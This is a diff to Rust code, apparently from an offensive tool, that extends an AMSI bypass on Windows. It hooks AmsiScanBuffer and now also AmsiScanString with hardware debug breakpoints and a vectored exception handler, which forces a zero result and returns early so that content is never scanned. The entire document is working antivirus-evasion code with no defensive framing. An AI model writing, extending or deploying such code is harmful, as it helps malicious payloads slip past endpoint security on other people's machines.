@@ -15,6 +15,9 @@ use windows_sys::Win32::{
 static mut AMSI_ADDR: usize = 0;
 
 #[cfg(target_os = "windows")]
+static mut AMSI_SCAN_STRING_ADDR: usize = 0;
+
+#[cfg(target_os = "windows")]
 pub unsafe fn install_amsi_bypass() {
     let mut amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr());
     if amsi == 0 {
@@ -25,6 +28,9 @@ pub unsafe fn install_amsi_bypass() {
     let scan_buffer = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr());
     AMSI_ADDR = core::mem::transmute::<_, usize>(scan_buffer);
 
+    let scan_string = GetProcAddress(amsi, b"AmsiScanString\0".as_ptr());
+    AMSI_SCAN_STRING_ADDR = core::mem::transmute::<_, usize>(scan_string);
+
     AddVectoredExceptionHandler(1, Some(amsi_veh_handler));
 
     let thread = GetCurrentThread();
@@ -33,6 +39,8 @@ pub unsafe fn install_amsi_bypass() {
     GetThreadContext(thread, &mut ctx);
     ctx.Dr0 = AMSI_ADDR as u64;
     ctx.Dr7 |= 0x1;
+    ctx.Dr2 = AMSI_SCAN_STRING_ADDR as u64;
+    ctx.Dr7 |= 0x10;
     SetThreadContext(thread, &ctx);
 }
 
@@ -45,7 +53,7 @@ unsafe extern "system" fn amsi_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32
     let context = &mut *(*info).ContextRecord;
 
     if record.ExceptionCode == EXCEPTION_SINGLE_STEP
-        && context.Rip == AMSI_ADDR as u64
+        && (context.Rip == AMSI_ADDR as u64 || context.Rip == AMSI_SCAN_STRING_ADDR as u64)
     {
         context.Rax = 0;
         context.Rip = *(context.Rsp as *const u64);
